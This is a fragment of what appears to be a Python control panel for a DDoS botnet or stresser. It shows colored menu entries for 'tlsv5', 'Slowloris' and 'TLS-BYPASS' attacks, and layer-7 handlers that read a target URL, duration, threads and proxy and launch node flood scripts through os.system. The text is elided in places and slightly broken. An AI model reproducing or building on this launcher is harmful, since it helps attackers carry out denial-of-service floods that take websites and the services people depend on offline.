...
\033[37mNull \x1b[38;2;0;255;255m►  \x1b[38;2;0;255;255mtlsv5 attack🚀
\033[37tlsv5 \x1b[38;2;0;255;255m► \x1b[38;2;0;255;255mSlowloris attack mode old🚀
\033[37mTLS-BYPASS \x1b[38;2;0;255;255m► \x1b[38;2;0;255;255mTLS-BYPASS attack🚀
...
# LAYER 7 METHODS
            ...
            try:
               ...
               time = cnc.split()[2]
               threads = cnc.split()[3]
               os.system(f'node HTTP-MIX.js {target} {time}')
            except IndexError:
               print('example: HTTP-MIX <https://target.com> <time>')
            ...
            try:
                ...
                threads = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'node TLS-BYPASS.js {url} {time} {request } {threads}')
            except IndexError:
                print('node tls.js https://target.com 120 15 2000')
